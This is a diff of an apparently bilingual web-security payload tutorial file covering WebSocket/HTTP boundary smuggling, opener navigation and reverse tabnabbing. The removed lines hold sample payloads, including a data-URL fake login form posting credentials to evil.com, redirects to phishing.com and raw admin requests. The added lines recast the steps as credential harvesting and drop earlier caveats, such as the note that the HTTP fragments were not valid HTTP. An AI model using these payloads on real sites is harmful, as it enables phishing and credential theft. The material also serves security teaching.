-          "zh": "WebSocket 消息与 HTTP 边界走私探针聚焦第 0 行是同帧连续 JSON 边界测试；第 1-2 行意图表示 HTTP 请求，但缺少必需 CRLF/空行，源文本本身不是合法 HTTP/1.1。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "WebSocket Message and HTTP Boundary-Smuggling Probes focuses on this boundary: Line 0 tests concatenated JSON values in one frame; lines 1-2 intend HTTP requests but lack required CRLF separators and the empty line, so the source text is not valid HTTP/1.1. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖 WebSocket 与 HTTP 边界走私探针场景，检验网关、消息解析器与后端对帧内多文档与嵌入 HTTP 文本的边界分歧。验证维度为连续 JSON 文档与原始请求片段的边界对照，对应第 1 步。",
+          "en": "This payload covers WebSocket versus HTTP boundary-smuggling probes, testing boundary disagreements across gateway, message parsers and backends for multi-document frames and embedded HTTP text. Validation contrasts consecutive JSON documents with raw request fragments, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "如果前端按帧、应用按流或代理把 WebSocket 数据重解释为 HTTP，不同组件可能对消息起止位置达成不同结论。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "If a frontend treats frames, an application treats a stream, or a proxy reinterprets WebSocket data as HTTP, components may disagree about message start and end. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于升级后链路对帧边界与 HTTP 消息边界的处理不一致：帧内嵌入的请求文本被某层当作独立 HTTP 消息解析，走私通道由此打开。",
+          "en": "The root cause is inconsistent handling of frame versus HTTP message boundaries along the upgraded chain: request text embedded in frames gets parsed as independent HTTP messages at some layer, opening the smuggling channel."
         },
         "exploitation": {
-          "zh": "先测试一个合法 JSON 与两个独立帧，再发送第 0 行同帧拼接；HTTP 分支仅使用 review 建议的 CRLF 修正版做隔离协议测试。 阳性要求两个组件产生可证明的边界分歧并使受控第二消息到达错误上下文；JSON 解析错误、断连、400 或原缺 CRLF 文本不算走私。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Test one valid JSON value and two separate frames before sending line 0 concatenated in one frame; use only the CRLF-corrected review suggestion for isolated HTTP protocol testing. Positive evidence requires demonstrable boundary disagreement between components that delivers a controlled second message into the wrong context; JSON parse errors, disconnects, 400 responses, or the source text without CRLF are not smuggling. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步按脚本在边界连接上逐条发送连续 JSON 与嵌入 HTTP 片段，观察网关与后端日志的解析分歧：嵌入请求被独立执行或日志出现额外请求即确认边界走私可行。成功判据以后端日志中的额外请求为准。占位符在全局变量菜单替换；目标限定授权实验路径。",
+          "en": "In step 1, send consecutive JSON and embedded HTTP fragments over boundary connections one by one per the script, watching gateway-versus-backend parse divergence; embedded requests executing independently or extra requests in logs confirm feasible boundary smuggling. Judge success by extra requests in backend logs. Replace placeholders via the global variables menu; targets restricted to authorized lab paths."
         },
         "mitigation": {
-          "zh": "严格按 RFC 6455 帧与应用消息 schema 解析，每帧只接受一个 JSON 值；禁止将消息文本重新解释为原始 HTTP，并统一代理/后端边界。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Parse RFC 6455 frames and the application schema strictly, accept one JSON value per message, never reinterpret message text as raw HTTP, and align proxy and backend boundaries. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "网关对升级连接禁用帧内容到 HTTP 的二次解析并统一消息边界实现，监控单帧多文档异常。修复后重放第 1 步，嵌入请求应保持为纯文本消息且无额外执行。",
+          "en": "Gateways must disable re-parsing frame content into HTTP on upgraded connections, unify message-boundary implementations, and alert on multi-document frames. After the fix, replay step 1: embedded requests should stay plain-text messages with no extra execution."
         },
         "difficulty": "expert"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认WebSocket/HTTP 消息边界前置条件",
-            "en": "Confirm WebSocket and HTTP Message Boundaries prerequisites"
+            "zh": "建立正常 WS 会话",
+            "en": "Establish a normal WS session"
           },
           "description": {
-            "zh": "第 0 行是同帧连续 JSON 边界测试；第 1-2 行意图表示 HTTP 请求，但缺少必需 CRLF/空行，源文本本身不是合法 HTTP/1.1。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "Line 0 tests concatenated JSON values in one frame; lines 1-2 intend HTTP requests but lack required CRLF separators and the empty line, so the source text is not valid HTTP/1.1. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "完成 WS 握手并收发一条合法 JSON 消息；确认默认的每帧一消息行为，作为后续边界攻击的参照形态。",
+            "en": "Complete the handshake and exchange one legal JSON message; the default one-message-per-frame behavior anchors the boundary attacks."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控WebSocket/HTTP 消息边界对照",
-            "en": "Run a controlled WebSocket and HTTP Message Boundaries comparison"
+            "zh": "同帧拼接探测解析边界",
+            "en": "Probe parsing boundaries with same-frame concatenation"
           },
           "description": {
-            "zh": "先测试一个合法 JSON 与两个独立帧，再发送第 0 行同帧拼接；HTTP 分支仅使用 review 建议的 CRLF 修正版做隔离协议测试。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Test one valid JSON value and two separate frames before sending line 0 concatenated in one frame; use only the CRLF-corrected review suggestion for isolated HTTP protocol testing. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "在同一帧内拼接两条 JSON 消息，并把原始 HTTP 片段混入消息文本发送；服务端解析出独立消息或把片段按 HTTP 处理即暴露边界分歧。",
+            "en": "Concatenate two JSON messages in one frame and mix raw HTTP fragments into message text; independent parsing or HTTP-style handling exposes the boundary flaw."
           },
-          "payload": "{\"type\":\"message\",\"content\":\"msg1\"}{\"type\":\"message\",\"content\":\"msg2\"}\nPOST /admin/preview HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\naction=status\nGET /admin/preview HTTP/1.1\r\nHost: target.com\r\nCookie: session=TEST_SESSION\r\n\r\n"
-        },
-        {
-          "title": {
-            "zh": "核对WebSocket/HTTP 消息边界阳性边界",
-            "en": "Verify WebSocket and HTTP Message Boundaries positive boundaries"
-          },
-          "description": {
-            "zh": "阳性要求两个组件产生可证明的边界分歧并使受控第二消息到达错误上下文；JSON 解析错误、断连、400 或原缺 CRLF 文本不算走私。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence requires demonstrable boundary disagreement between components that delivers a controlled second message into the wrong context; JSON parse errors, disconnects, 400 responses, or the source text without CRLF are not smuggling. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归WebSocket/HTTP 消息边界",
-            "en": "Remediate and regress WebSocket and HTTP Message Boundaries"
+            "zh": "借边界分歧扩大上下文",
+            "en": "Abuse the divergence to reach new contexts"
           },
           "description": {
-            "zh": "严格按 RFC 6455 帧与应用消息 schema 解析，每帧只接受一个 JSON 值；禁止将消息文本重新解释为原始 HTTP，并统一代理/后端边界。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Parse RFC 6455 frames and the application schema strictly, accept one JSON value per message, never reinterpret message text as raw HTTP, and align proxy and backend boundaries. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "利用代理与后端对帧内内容的解释差异，把第二段内容送入管理路径或他人会话上下文；受控内容到达错误上下文即完成消息走私。",
+            "en": "Exploit differing interpretations of frame content to deliver the second segment into admin paths or another user's context; landing in the wrong context completes the smuggling."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -1802,63 +1804,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "跨源 opener 导航能力对照聚焦前四类语句测试跨源 Location 能力，document.location 需跨过 SOP，data/javascript 还受现代导航安全限制；不是 XSS。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "Cross-Origin Opener Navigation Capability Controls focuses on this boundary: The first forms test cross-origin Location capabilities, document.location crosses SOP, and data or javascript schemes face modern navigation restrictions; this is not XSS. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖跨源 opener 导航能力对照场景，检验同源策略下对原窗口 location 的可写边界。验证维度为赋值、href、replace 与跨源读取的逐项对照，对应第 1 步。",
+          "en": "This payload covers cross-origin opener navigation capability comparisons, testing same-origin-policy boundaries on writing the original window's location. Validation itemizes assignment, href, replace and cross-origin reads, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "新页保留 opener 时可在有限跨源 WindowProxy/Location 能力内导航原页，但不能读取或任意操作跨源 document。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "When a child retains opener, it can navigate the original page through limited cross-origin WindowProxy or Location capabilities but cannot read or arbitrarily manipulate the cross-origin document. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于同源策略允许跨源写 opener.location 而阻止读：保留 opener 的页面被打开后可把原窗口导航到伪造登录页，完成钓鱼接力。",
+          "en": "The root cause is the same-origin policy allowing cross-origin writes to opener.location while blocking reads: pages retaining opener can navigate the original window to forged login pages, completing a phishing relay."
         },
         "exploitation": {
-          "zh": "先确认 opener 非空，再逐行记录受控导航或 SecurityError；location 赋值/href/replace 与 assign/document/data/javascript 分开判断。 阳性 Tabnabbing 是子页使 opener 导航到受控标记 URL；能读取 document、执行 javascript 或 data 页面必须有独立证据，异常或静默失败不算。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Confirm a non-null opener, then record controlled navigation or SecurityError per line, evaluating assignment, href, and replace separately from assign, document, data, and javascript cases. Positive tabnabbing is the child navigating the opener to a controlled marker URL; document reads, javascript execution, or data-page navigation require independent evidence, and exceptions or silent failure are not positive. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步按脚本在不同导航写法下打开对照页并逐项检查 opener 可用性与导航效果：opener 可写且原窗口被定向到伪造页即确认导航能力未隔离，同时记录读取被拒的同源策略边界。成功判据以导航成功与读取拒绝矩阵为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, open comparison pages under each navigation style per the script, itemizing opener availability and navigation effects; writable openers steering the original window to forged pages confirm unisolated navigation, with same-origin read rejections recorded alongside. Judge success by the navigation-success versus read-rejection matrix. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "默认切断 opener，使用 noopener/noreferrer 与 COOP；必须通信时仅对受信源使用 postMessage 并严格校验 origin。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Sever opener by default with noopener, noreferrer, and COOP; when communication is required, use postMessage only with trusted origins and strict origin validation. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "全部出站链接与 window.open 调用强制 noopener noreferrer，钓鱼页面防护依赖浏览器孤立上下文。修复后重放第 1 步，所有写法的 opener 应为空且导航无从发起。",
+          "en": "Force noopener noreferrer on all outbound links and window.open calls, relying on browser context isolation against phishing pages. After the fix, replay step 1: opener should be null across every style, making navigation impossible."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认opener 跨源导航前置条件",
-            "en": "Confirm Cross-Origin Opener Navigation prerequisites"
+            "zh": "确认 opener 引用可达",
+            "en": "Confirm the opener reference is reachable"
           },
           "description": {
-            "zh": "前四类语句测试跨源 Location 能力，document.location 需跨过 SOP，data/javascript 还受现代导航安全限制；不是 XSS。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The first forms test cross-origin Location capabilities, document.location crosses SOP, and data or javascript schemes face modern navigation restrictions; this is not XSS. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "从目标站外链打开可控子页并检查 window.opener 是否非空；引用存在即具备反向导航目标页面的能力基础，进入写法测试。",
+            "en": "Open a controlled child via the site's external link and check window.opener; a non-null reference is the prerequisite for navigating the parent."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控opener 跨源导航对照",
-            "en": "Run a controlled Cross-Origin Opener Navigation comparison"
+            "zh": "逐条测试导航写法",
+            "en": "Test each navigation idiom"
           },
           "description": {
-            "zh": "先确认 opener 非空，再逐行记录受控导航或 SecurityError；location 赋值/href/replace 与 assign/document/data/javascript 分开判断。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Confirm a non-null opener, then record controlled navigation or SecurityError per line, evaluating assignment, href, and replace separately from assign, document, data, and javascript cases. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "依次执行 location 赋值、href、replace、assign 等写法把 opener 导向攻击者域；原页面被替换或抛出安全错误即明确可用能力边界。",
+            "en": "Try location assignment, href, replace and assign against the opener; replaced pages versus SecurityErrors map the exploitable capability set."
           },
-          "payload": "window.opener.location = \"https://phishing.com\"\nwindow.opener.location.href = \"https://phishing.com\"\nwindow.opener.location.replace(\"https://phishing.com\")\nwindow.opener.location.assign(\"https://phishing.com\")\nwindow.opener.document.location = \"https://phishing.com\"\nwindow.opener.document.location.href = \"https://phishing.com\"\nwindow.opener.location = \"https://phishing.com/login\"\nwindow.opener.location = \"data:text/html,<h1>Please login again</h1><form action=https://evil.com><input name=user><input name=pass type=password><button>Submit</button></form>\"\nwindow.opener.location = \"javascript:document.write('<h1>Please login again</h1>')\""
-        },
-        {
-          "title": {
-            "zh": "核对opener 跨源导航阳性边界",
-            "en": "Verify Cross-Origin Opener Navigation positive boundaries"
-          },
-          "description": {
-            "zh": "阳性 Tabnabbing 是子页使 opener 导航到受控标记 URL；能读取 document、执行 javascript 或 data 页面必须有独立证据，异常或静默失败不算。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive tabnabbing is the child navigating the opener to a controlled marker URL; document reads, javascript execution, or data-page navigation require independent evidence, and exceptions or silent failure are not positive. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归opener 跨源导航",
-            "en": "Remediate and regress Cross-Origin Opener Navigation"
+            "zh": "替换原页实施钓鱼",
+            "en": "Swap the page for phishing"
           },
           "description": {
-            "zh": "默认切断 opener，使用 noopener/noreferrer 与 COOP；必须通信时仅对受信源使用 postMessage 并严格校验 origin。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Sever opener by default with noopener, noreferrer, and COOP; when communication is required, use postMessage only with trusted origins and strict origin validation. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "把原页面导航到仿真登录页并保持地址栏迷惑性；用户切回原标签输入凭据，即完成 tabnabbing 式的凭据收割。",
+            "en": "Navigate the original page to a login lookalike; the user switching back to the familiar tab feeds credentials straight to the attacker."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -1968,63 +1971,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "反向 Tabnabbing opener 正负对照聚焦九行混合真正的 opener opt-in、noopener/noreferrer 负对照、脚本 window.open 与一条逻辑错误的自我导航示例。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "Reverse-Tabnabbing Opener Positive and Negative Controls focuses on this boundary: The nine lines mix genuine opener opt-in, noopener or noreferrer negative controls, script window.open, and one logically flawed self-navigation example. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖反向标签劫持的 opener 正负对照场景，检验不同 rel 与 open 组合下原窗口控制权归属。验证维度为 opener 关键字、冲突 rel 与 open 特性的对照矩阵，对应第 1 步。",
+          "en": "This payload covers reverse-tabnabbing opener positive-negative comparisons, testing original-window control across rel and open combinations. Validation is a comparison matrix of opener keywords, conflicting rel values and open features, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "只有子页获得 opener 引用且浏览上下文策略允许导航时，反向 Tabnabbing 才成立；冲突关键字与 COOP 可切断引用。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "Reverse tabnabbing exists only when the child receives an opener reference and browsing-context policy permits navigation; conflicting link types and COOP can sever it. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于 rel 关键字冲突时浏览器取宽松解释且 open 特性可显式请求 opener：外部页面获得原窗口引用后即可实施反向劫持。",
+          "en": "The root cause is browsers taking lenient interpretations on conflicting rel keywords while open features can request opener explicitly: external pages gaining the original-window reference execute reverse hijacks."
         },
         "exploitation": {
-          "zh": "逐行打开受控子页，由子页报告 opener 状态并尝试一次标记导航；分别记录链接 rel 与 window.open feature 的结果。 阳性必须由子页代码控制父页导航；父页自身 onclick 导航、仅返回 WindowProxy、新标签打开或目标页加载都不是攻击证据。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Open the controlled child per line, have the child report opener state and attempt one marker navigation, and record results for link rel and window.open features separately. Positive evidence requires child code to control parent navigation; navigation by the parent's own onclick, a returned WindowProxy, a new tab, or destination loading is not attack evidence. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步按脚本部署各组合的打开对照页，在新窗口检查 opener 并尝试反向导航原窗口：任一组合保留控制权即确认劫持可行，统计各浏览器版本的行为差异。成功判据以控制权保留矩阵为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, deploy open-comparison pages per combination per the script, checking opener in the new window and attempting reverse navigation of the original; any combination retaining control confirms hijack feasibility, tallying behavior differences across browser versions. Judge success by the control-retention matrix. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "对不受信目标使用 noopener/noreferrer 和 COOP，不混用 opener 与隔离关键字；需要通信时用受限 postMessage。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Use noopener, noreferrer, and COOP for untrusted destinations, do not mix opener with isolation keywords, and use constrained postMessage when communication is required. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "链接与脚本打开统一显式 noopener 并审计冲突 rel 用法，关键页面加离开确认缓解静默替换。修复后重放第 1 步矩阵，全部组合的 opener 应为空。",
+          "en": "Unify explicit noopener across links and scripted opens with audits of conflicting rel usage, adding leave confirmations on critical pages against silent swaps. After the fix, replay the step 1 matrix: opener should be null for every combination."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认反向 Tabnabbing opener 控制前置条件",
-            "en": "Confirm Reverse-Tabnabbing Opener Controls prerequisites"
+            "zh": "构造多种打开方式",
+            "en": "Prepare multiple opening idioms"
           },
           "description": {
-            "zh": "九行混合真正的 opener opt-in、noopener/noreferrer 负对照、脚本 window.open 与一条逻辑错误的自我导航示例。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The nine lines mix genuine opener opt-in, noopener or noreferrer negative controls, script window.open, and one logically flawed self-navigation example. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "在可控页面准备 target=_blank 配 rel=opener、opener 与 noopener 混写及 window.open 等多种打开方式，等待或诱导目标站引用这些链接。",
+            "en": "Stage links mixing target=_blank with rel=opener, conflicting keywords and window.open; wait for or bait the target site into hosting them."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控反向 Tabnabbing opener 控制对照",
-            "en": "Run a controlled Reverse-Tabnabbing Opener Controls comparison"
+            "zh": "验证 opener 保留与可控",
+            "en": "Verify the opener survives and is controllable"
           },
           "description": {
-            "zh": "逐行打开受控子页，由子页报告 opener 状态并尝试一次标记导航；分别记录链接 rel 与 window.open feature 的结果。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Open the controlled child per line, have the child report opener state and attempt one marker navigation, and record results for link rel and window.open features separately. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "依次用第 1 步的组合打开子页并检查 opener 状态；引用非空且子页可执行导航即锁定可反向利用的打开方式，弃用已隔离的组合。",
+            "en": "Open children with each staged combination and check opener; non-null references that allow navigation identify the exploitable idiom."
           },
-          "payload": "<a href=\"https://evil.com/tabnabbing\" target=\"_blank\" rel=\"opener\">Click here</a>\n<a href=\"https://evil.com/tabnabbing\" target=\"_blank\" rel=\"opener noopener\">Click here</a>\n<a href=\"https://evil.com/tabnabbing\" target=\"_blank\" rel=\"opener noreferrer\">Click here</a>\n<a href=\"javascript:void(0)\" target=\"_blank\" onclick=\"window.open('https://evil.com/tabnabbing','_blank')\">Click here</a>\n<a href=\"javascript:void(0)\" target=\"_blank\" onclick=\"var w=window.open('https://evil.com/tabnabbing','_blank');w.opener.location='https://phishing.com'\">Click here</a>\nwindow.open(\"https://evil.com/tabnabbing\", \"_blank\")\nwindow.open(\"https://evil.com/tabnabbing\", \"_blank\", \"noopener\")\nwindow.open(\"https://evil.com/tabnabbing\", \"_blank\", \"noreferrer\")\nwindow.open(\"https://evil.com/tabnabbing\", \"_blank\", \"noopener,noreferrer\")"
-        },
-        {
-          "title": {
-            "zh": "核对反向 Tabnabbing opener 控制阳性边界",
-            "en": "Verify Reverse-Tabnabbing Opener Controls positive boundaries"
-          },
-          "description": {
-            "zh": "阳性必须由子页代码控制父页导航；父页自身 onclick 导航、仅返回 WindowProxy、新标签打开或目标页加载都不是攻击证据。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence requires child code to control parent navigation; navigation by the parent's own onclick, a returned WindowProxy, a new tab, or destination loading is not attack evidence. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归反向 Tabnabbing opener 控制",
-            "en": "Remediate and regress Reverse-Tabnabbing Opener Controls"
+            "zh": "反向导航父页面",
+            "en": "Navigate the parent from the child"
           },
           "description": {
-            "zh": "对不受信目标使用 noopener/noreferrer 和 COOP，不混用 opener 与隔离关键字；需要通信时用受限 postMessage。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Use noopener, noreferrer, and COOP for untrusted destinations, do not mix opener with isolation keywords, and use constrained postMessage when communication is required. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "子页执行 opener.location 跳向钓鱼域；父页面被静默替换即完成反向 tabnabbing，收割回访用户输入的登录凭据。",
+            "en": "The child sets opener.location to the phishing domain; the silently replaced parent harvests credentials from returning users."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
